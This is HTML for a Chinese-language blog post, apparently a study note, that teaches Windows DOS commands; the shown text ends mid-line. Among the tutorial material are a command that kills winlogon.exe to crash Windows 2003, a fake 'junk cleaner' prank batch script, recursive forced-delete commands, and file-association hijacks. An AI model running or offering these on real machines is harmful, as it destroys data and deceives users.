@@ -1,0 +1,1304 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>windows | Jughead YQQ</title><meta name="keywords" content="Windows"><meta name="author" content="Jughead YQQ"><meta name="copyright" content="Jughead YQQ"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Windows Server的各种服务&#x2F;漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows">
+<meta property="og:url" content="https://jason177.com/2022/05/12/windows/index.html">
+<meta property="og:site_name" content="Jughead YQQ">
+<meta property="og:description" content="Windows Server的各种服务&#x2F;漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xssqg/image/202206151611273.jpg">
+<meta property="article:published_time" content="2022-05-12T05:01:26.000Z">
+<meta property="article:modified_time" content="2022-06-15T08:04:16.000Z">
+<meta property="article:author" content="Jughead YQQ">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/xssqg/image/202206151611273.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/xssqg/image/1.jpeg"><link rel="canonical" href="https://jason177.com/2022/05/12/windows/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="IspIaguCg9O4W3zWyG50FDPiJbz9XorXelabPha7i38"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-3ERYSKYBLP"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-3ERYSKYBLP');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'windows',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-06-15 16:04:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Jughead YQQ" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/1.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/shuoshuo"><i class="fa-fw far fa-comment-dots"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-trophy"></i><span> CTF平台</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://ctf.bugku.com/"><i class="fa-fw fas fa-dice-one"></i><span> Bugku</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.ctfhub.com/"><i class="fa-fw fas fa-dice-two"></i><span> CTFHub</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.xctf.org.cn/"><i class="fa-fw fas fa-dice-three"></i><span> XCTF</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.ichunqiu.com/battalion?t=1"><i class="fa-fw fas fa-dice-four"></i><span> i春秋</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw far fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/xssqg/image/202206151611273.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Jughead YQQ</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/shuoshuo"><i class="fa-fw far fa-comment-dots"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-trophy"></i><span> CTF平台</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://ctf.bugku.com/"><i class="fa-fw fas fa-dice-one"></i><span> Bugku</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.ctfhub.com/"><i class="fa-fw fas fa-dice-two"></i><span> CTFHub</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.xctf.org.cn/"><i class="fa-fw fas fa-dice-three"></i><span> XCTF</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.ichunqiu.com/battalion?t=1"><i class="fa-fw fas fa-dice-four"></i><span> i春秋</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw far fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">windows</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-12T05:01:26.000Z" title="发表于 2022-05-12 13:01:26">2022-05-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-06-15T08:04:16.000Z" title="更新于 2022-06-15 16:04:16">2022-06-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Windows/">Windows</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">19.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>64分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="windows"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/05/12/windows/#post-comment"><span id="twikoo-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="windows2003蓝屏炸弹"><a href="#windows2003蓝屏炸弹" class="headerlink" title="windows2003蓝屏炸弹"></a>windows2003蓝屏炸弹</h1><p>有个巨大漏洞，就是有个进程名叫winlogon.exe，可以使用<code>ntsd -c q -pn winlogon.exe</code>命令强制杀死，这个进程是windows2003登录的进程，如果被杀死，则直接蓝屏，需要注意</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205310115360.png" alt="image-20220531011527240"></p>
+<h1 id="DOS基础命令"><a href="#DOS基础命令" class="headerlink" title="DOS基础命令"></a>DOS基础命令</h1><ol>
+<li>图像界面入侵</li>
+<li>命令行入侵，命令行也叫shell，行话：拿到对方的shell</li>
+</ol>
+<h2 id="fsutil"><a href="#fsutil" class="headerlink" title="fsutil"></a>fsutil</h2><p>windows命令行中查看所有的磁盘：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsutil fsinfo drives #这里必须要有权限才能看到</span><br></pre></td></tr></table></figure>
+
+<p>创建文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsutil file createnew c:\test\haha.txt 3000      # 3000个字节，接近于3kb</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="md"><a href="#md" class="headerlink" title="md"></a>md</h2><p>创建文件夹，用空格区分开。如果文件夹需要有空格，则用双引号引起来</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;md <span class="string">&quot;ni hao&quot;</span>			<span class="comment">#</span></span> </span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;md nihao hahaha		<span class="comment"># 一次创建两个文件夹</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="rd"><a href="#rd" class="headerlink" title="rd"></a>rd</h2><p>删除文件夹，也可以用空格隔开一次性删除多个文件夹</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;rd nihao hahaha      <span class="comment"># 删除这两个文件夹</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;rd <span class="string">&quot;ni hao&quot;</span>			<span class="comment"># 文件夹不是空的，删不了，那只能加/s，表示递归删除</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;rd <span class="string">&quot;ni hao&quot;</span> /s/q		<span class="comment"># 无提示强制删除，跟linux里面的rm -rf的f一样</span></span></span><br></pre></td></tr></table></figure>
+
+<p>如果想要删除当前文件夹下的所有文件,比如说当前路径为C:testdos，要删除当前目录下的所有文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301337075.png" alt="image-20220530133703958"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\testdos&gt;rd . /s/q	# 文件和文件夹都删除</span><br><span class="line">另一个程序正在使用此文件，进程无法访问。</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里虽然有警告说testdos文件夹正在使用所以无法删除，但是这就是我们主要的目的，不是删除testdos文件夹，而是说删除这个文件夹下面的所有文件</span></span><br><span class="line"></span><br><span class="line"> C:\testdos 的目录</span><br><span class="line"></span><br><span class="line">2022/05/30  13:37    &lt;DIR&gt;          .</span><br><span class="line">2022/05/30  13:37    &lt;DIR&gt;          ..</span><br><span class="line">               0 个文件              0 字节</span><br><span class="line">               2 个目录  8,328,355,840 可用字节</span><br><span class="line">               </span><br><span class="line"><span class="meta">#</span><span class="bash"> 所有文件夹和文件都没了</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><p>创建文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo hello &gt; haha.txt</span><br><span class="line"></span><br><span class="line"> C:\testdos 的目录</span><br><span class="line"></span><br><span class="line">2022/05/30  13:53    &lt;DIR&gt;          .</span><br><span class="line">2022/05/30  13:53    &lt;DIR&gt;          ..</span><br><span class="line">2022/05/30  13:53                 8 haha.txt</span><br></pre></td></tr></table></figure>
+
+<p>echo还可以打印文字</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title &quot;echo处理&quot;</span><br><span class="line">echo &quot;jason&quot;</span><br><span class="line">echo.		# 会输出空行</span><br><span class="line">echo &quot;nihao&quot;</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205310035754.png" alt="image-20220531003548648"></p>
+<h2 id="taskkill"><a href="#taskkill" class="headerlink" title="taskkill"></a>taskkill</h2><p>杀死任务、进程</p>
+<ul>
+<li>/im：指定杀死哪个进程</li>
+<li>/f：force，强制杀死进程</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">title &quot;处理进程&quot;</span><br><span class="line">echo.		</span><br><span class="line">echo ============</span><br><span class="line">echo &quot;准备删除进程&quot;</span><br><span class="line">echo ============</span><br><span class="line">echo.</span><br><span class="line">pause</span><br><span class="line">taskkill /im explorer.exe /f &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure>
+
+<h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>给其它ip地址发送数据包，检查连通性</p>
+<ul>
+<li>-n：自己选择发送多少个数据包</li>
+<li>-t：一直ping</li>
+</ul>
+<p>这个可以让用户觉得cmd已经假死了</p>
+<p>下面制作一个假装是清除垃圾的脚本，实则是整人</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">title &quot;清理垃圾&quot;</span><br><span class="line">echo.		</span><br><span class="line">echo ============</span><br><span class="line">echo &quot;准备删除系统垃圾&quot;</span><br><span class="line">echo ============</span><br><span class="line">echo.</span><br><span class="line">echo 按任意键删除垃圾</span><br><span class="line">pause</span><br><span class="line">echo.</span><br><span class="line">echo 垃圾清理中...</span><br><span class="line">ping -n 8 127.0.0.1 &gt;nul 2&gt;nul</span><br><span class="line">taskkill /im explorer.exe /f &gt;nul 2&gt;nul</span><br><span class="line">echo 哈哈，你被整了</span><br><span class="line">ping -n 8 127.0.0.1 &gt;nul 2&gt;nul</span><br><span class="line">start c:\windows\explorer.exe</span><br><span class="line">echo ====被吓死了吧=====</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="type"><a href="#type" class="headerlink" title="type"></a>type</h2><p>打印一个文件的内容到终端</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;<span class="built_in">type</span> haha.txt</span></span><br><span class="line">hello</span><br></pre></td></tr></table></figure>
+
+<h2 id="del"><a href="#del" class="headerlink" title="del"></a>del</h2><p>删除文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">del haha.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 可以使用通配符删除</span></span></span><br><span class="line">del *.txt  #删除当前目录下的全部txt文本文件</span><br><span class="line">del *.* /q   #quit静默删除，无提示删除文件</span><br><span class="line">del *.* /s/q #递归删除，这条命令删除当前目录下的所有文件，包括子目录</span><br></pre></td></tr></table></figure>
+
+<h2 id="gt-gt"><a href="#gt-gt" class="headerlink" title="&gt;&gt;"></a>&gt;&gt;</h2><p>echo创建文件的方法跟这个一样，这个符号是追加内容到某个文件里的，就是linux中的重定向。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;jason&quot; &gt;&gt; haha.txt   # 追加内容到haha.txt文件里，如果没有该文件则创建并且追加</span><br><span class="line"></span><br><span class="line">dir &gt;&gt; dir.txt 			   # 把dir的内容重定向到dir.txt文件中</span><br><span class="line"></span><br><span class="line">rd . /s/q 2&gt;&gt;c:/test/rd.txt		   # 把报错内容重定向到文件中,默认的重定向是不报错的内容(就是1，1可以不写，报错是2)</span><br><span class="line"></span><br><span class="line">rd . /s/q 1&gt;c:/test/rd.txt 2&gt;&amp;1	   # 报错和正确的内容都重定向到文件中</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301359550.png" alt="image-20220530135930489"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301432004.png" alt="image-20220530143231879"></p>
+<p>这里没注意路径，直接才C盘根目录遍历删除了文件！！！跟在linux中的根目录下<code>rm -rf *</code>一样！！还好我马上停止了，但是也删除了好多文件，只能慢慢回退一些可以回退的文件(因为我没有快照)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301435491.png" alt="image-20220530143501408"></p>
+<h2 id="nul"><a href="#nul" class="headerlink" title="nul"></a>nul</h2><p>把输出在终端的命令丢弃</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del *.* /s/q &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure>
+
+<h2 id="ren"><a href="#ren" class="headerlink" title="ren"></a>ren</h2><p>修改名字，重命名rename</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ren haha.txt nohaha.txt	#haha.txt名字修改成nohaha.txt</span><br><span class="line">ren 123 456  # 123文件夹名称修改为456</span><br></pre></td></tr></table></figure>
+
+<h2 id="attrib"><a href="#attrib" class="headerlink" title="attrib"></a>attrib</h2><p>attribute,属性的意思，修改属性的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +h haha.txt		#增加一个h：hide，隐藏属性</span><br></pre></td></tr></table></figure>
+
+<p>这时候，如果没有点击”显示隐藏文件”的按钮，则看不到该文件，dir也没用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +s +h haha.txt   # +s变成系统文件，+h隐藏属性</span><br></pre></td></tr></table></figure>
+
+<p>提升为系统级隐藏文件，点击”显示隐藏文件”按钮也没用了，除非使用<code>dir /a</code>，就可以看到haha.txt了，也可以关掉”隐藏受保护的系统文件”的√，就可以了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">attrib /?	#显示用法</span><br><span class="line"></span><br><span class="line">attrib /s	#显示当前目录下的各个文件属性</span><br></pre></td></tr></table></figure>
+
+<p>用法：attrib[盘符:][路径][文件名][+r][-r][+a][-a][+s][-s][+h][-h][/s][/d][/?]</p>
+<p>参数说明：</p>
+<p>+r 设置只读属性</p>
+<p>-r 取消只读属性</p>
+<p>+a 设置存档属性</p>
+<p>-a 取消存档属性</p>
+<p>+s 设置系统属性</p>
+<p>-s 取消系统属性</p>
+<p>+h 设置隐藏属性</p>
+<p>-h 取消隐藏属性</p>
+<p>/s 显示目录下所有文件的属性</p>
+<p>/d 将attrib和任意命令行选项应用到目录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206021521348.png" alt="image-20220602152135650"></p>
+<h2 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h2><ul>
+<li>-s：/s也可以，这个意思是要做定时关机</li>
+<li>-t：指定定时关机的时间</li>
+<li>-a：停止关机</li>
+<li>-f：强制关机，不管有什么程序正在运行，都要关机</li>
+<li>-r：定时重启，取代-s的位置</li>
+<li>-l：注销</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shutdown -s -f -t 60  #秒为单位，60秒后关机</span><br><span class="line">shutdown -r -f -t 60  #秒为单位，60秒后重启</span><br><span class="line">shutdown -a 	      #取消定时</span><br><span class="line">shutdown -l           #注销，跟logoff一样</span><br></pre></td></tr></table></figure>
+
+<h2 id="title"><a href="#title" class="headerlink" title="title"></a>title</h2><p>为cmd提供一个标题</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title 系统垃圾清理   	#标题就会变成&quot;系统垃圾清理&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="assoc"><a href="#assoc" class="headerlink" title="assoc"></a>assoc</h2><p>修改文件关联性，比如说windows识别到txt结尾的文件就会使用记事本打开</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">assoc .txt=exefile 	#意思就是以后系统看到txt后缀的文件，就当作是执行文件使用</span><br><span class="line">assoc .wav=exefile</span><br><span class="line">assoc .bmp=exefile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">assoc .exe=txtfile  #exe后缀的文件都当作是txt文本打开(使用记事本打开)，这个需要谨慎操作，因为cmd也是exe执行文件，如果修改						了，cmd都用不了了，脚本也就操作不了了</span><br><span class="line"><span class="meta">#</span><span class="bash">修复</span></span><br><span class="line">assoc .txt=txtfile</span><br><span class="line">assoc .wav=exefile</span><br><span class="line">assoc .bmp=bmpfile</span><br></pre></td></tr></table></figure>
+
+<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>作用：显示、设置或删除cmd.exe环境变量。</p>
+<p>要求：SET命令不允许变量名含有等号。</p>
+<h3 id="1-显示当前环境变量以及值"><a href="#1-显示当前环境变量以及值" class="headerlink" title="1.显示当前环境变量以及值"></a>1.显示当前环境变量以及值</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\75717\Desktop&gt;set</span><br><span class="line">ALLUSERSPROFILE=C:\ProgramData</span><br><span class="line">APPDATA=C:\Users\75717\AppData\Roami</span><br><span class="line">CommonProgramFiles=C:\Program Files\</span><br><span class="line">CommonProgramFiles(x86)=C:\Program F</span><br><span class="line">CommonProgramW6432=C:\Program Files\</span><br><span class="line">COMPUTERNAME=WIN-QBF046B1789</span><br><span class="line">ComSpec=C:\Windows\system32\cmd.exe</span><br><span 